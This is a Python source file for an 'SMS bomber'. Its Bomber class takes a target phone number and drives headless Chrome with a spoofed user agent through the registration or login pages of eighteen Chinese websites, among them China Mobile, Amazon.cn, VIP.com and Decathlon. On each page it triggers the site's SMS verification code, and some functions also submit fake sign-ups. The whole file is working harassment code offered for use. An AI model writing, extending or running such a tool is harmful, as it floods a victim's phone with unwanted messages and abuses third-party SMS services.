import time
from selenium import webdriver
from user_agent import user_agent

import string

class Bomber(object):

    def __init__(self, phone):
        self.phone = phone
        self.options = webdriver.ChromeOptions()
        self.options.add_argument(user_agent.getheaders())  #添加header
        self.options.add_argument('--headless') # 后台模式


    #中国移动
    def func0(self):
        browser = webdriver.Chrome(chrome_options=self.options)  # chrome驱动
        browser.implicitly_wait(8)
        browser.get('https://login.10086.cn/login.html')
        browser.find_element_by_xpath('//*[@id="sms_login_1"]').click()
        browser.find_element_by_xpath('//*[@id="sms_name"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="getSMSPwd1"]').click()
        browser.quit()

    # 51book
    def func1(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://caigou.51book.com/caigou/manage/designatedRegistryNewSignon.in')
        browser.find_element_by_xpath('//*[@id="cg_06"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="sendMSgBtu"]').click()
        browser.quit()

    #世界邦
    def func2(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://www.shijiebang.com/reg/')
        browser.find_element_by_xpath('/html/body/div[1]/div/div[3]/div/ul[1]/li[1]/a').click()
        browser.find_element_by_xpath('/html/body/div[8]/div[2]/div/div[2]/div/label[2]/input').click()
        browser.find_element_by_xpath(
            '/html/body/div[8]/div[2]/div/div[2]/table[2]/tbody/tr[1]/td/div/input').send_keys(self.phone)
        browser.find_element_by_xpath('/html/body/div[8]/div[2]/div/div[2]/table[2]/tbody/tr[2]/td/div/button').click()
        browser.quit()


        # 亚马逊，对于已经注册的手机号不生效

    def func3(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get(
            'https://www.amazon.cn/ap/register?_encoding=UTF8&openid.assoc_handle=cnflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.cn%2Fgp%2Fyourstore%2Fhome%3Fie%3DUTF8%26ref_%3Dnav_custrec_newcust')
        # browser.find_element_by_xpath('//*[@id="nav-flyout-ya-newCust"]/a').click()
        browser.find_element_by_xpath('//*[@id="ap_customer_name"]').send_keys('Mike998')
        browser.find_element_by_xpath('//*[@id="ap_phone_number"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="ap_password"]').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="ap_register_form"]/div/div/div[5]/div/label/input').click()
        browser.find_element_by_xpath('//*[@id="continue"]').click()
        browser.quit()



        # 千米

    def func4(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.1000.com/reg?us=3W-head')
        browser.find_element_by_xpath(
            '//*[@id="react-content"]/div/div/div/div[2]/form/div[2]/div[2]/div/div/input').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="send_code"]').click()
        # time.sleep(5)
        browser.quit()

        # 唯品会

    def func5(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://passport.vip.com/register')
        browser.find_element_by_xpath('//*[@id="J_mobile_name"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="J_mobile_verifycode_btn"]').click()
        browser.quit()

        # 嗨厨房

    def func6(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://m.haichufang.com/reg.html')
        browser.find_element_by_xpath('//*[@id="login"]/div[2]/input').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="login"]/div[2]/div[2]/div[1]').click()
        browser.quit()



        # 巨人网络

    def func7(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://reg.ztgame.com/')
        browser.find_element_by_xpath('//*[@id="reg_form"]/div[1]/input').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="reg_form"]/div[2]/input[2]').click()
        # time.sleep(5)
        browser.quit()

        # 微盟

    def func8(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://account.weimob.com/register')
        browser.find_element_by_xpath('//*[@id="phone"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="signUpForm"]/div[3]/a').click()
        # time.sleep(5)
        browser.quit()

        # 商品宅配

    def func9(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://www.homekoo.com/zhixiao/cuxiao/index.php')
        browser.find_element_by_xpath('//*[@id="username5"]').send_keys(u'张飞')
        browser.find_element_by_xpath('//*[@id="tel5"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="submit_img5"]').click()
        # time.sleep(5)
        browser.quit()

        # 快乐购

    def func10(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://www.happigo.com/register/')
        browser.find_element_by_xpath('//*[@id="mobile"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="send_auth_code"]').click()
        # time.sleep(5)
        browser.quit()

        # 手机中国

    def func11(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://passport.cnmo.com/register/')
        browser.find_element_by_xpath('//*[@id="m_mobile"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="m_uname"]').send_keys('helloworld998')
        browser.find_element_by_xpath('//*[@id="m_password"]').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="m_confirm"]').send_keys('pwd123456')
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="m_getcode"]').click()
        # time.sleep(5)
        browser.quit()



    def func12(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.facebank.cn/user.html')
        # browser.switch_to.alert()
        browser.find_element_by_xpath('//*[@id="mobile"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="getSmsCode"]').click()
        time.sleep(1)
        browser.quit()


    def func13(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://jrh.financeun.com/Login/jrwLogin?web=jrw')
        browser.find_element_by_xpath('//*[@id="login-segment-phoneLogin"]').click()
        browser.find_element_by_xpath('//*[@id="quickMobile"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="quickSendMsgCode"]').click()
        # time.sleep(5)
        browser.quit()


    #迪卡侬
    def func14(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.decathlon.com.cn/zh/create')
        browser.find_element_by_xpath('//*[@id="mobile"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="login-button"]').click()
        time.sleep(1)
        browser.quit()

    def func15(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://my.ruanmei.com/?page=register')
        browser.find_element_by_xpath('//*[@id="phone"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('//*[@id="sendsms"]').click()
        browser.quit()

    #聚合数据
    def func16(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('https://www.juhe.cn/register')
        browser.find_element_by_xpath('//*[@id="username"]').send_keys('helloworld998')
        browser.find_element_by_xpath('//*[@id="password"]').send_keys('pwd123456')
        browser.find_element_by_xpath('//*[@id="mobilephone"]').send_keys(self.phone)
        browser.find_element_by_xpath('//*[@id="reg_smsbtn"]').click()
        time.sleep(1)
        browser.quit()

    def func17(self):
        browser = webdriver.Chrome(chrome_options=self.options)
        browser.implicitly_wait(8)
        browser.get('http://passport.zongheng.com/webreg?location=http%3A%2F%2Fwww.zongheng.com%2F')
        browser.find_element_by_xpath('//*[@id="regphone"]').send_keys(self.phone)
        time.sleep(1)
        browser.find_element_by_xpath('/html/body/div[3]/div[2]/p[3]/span').click()
        browser.quit()

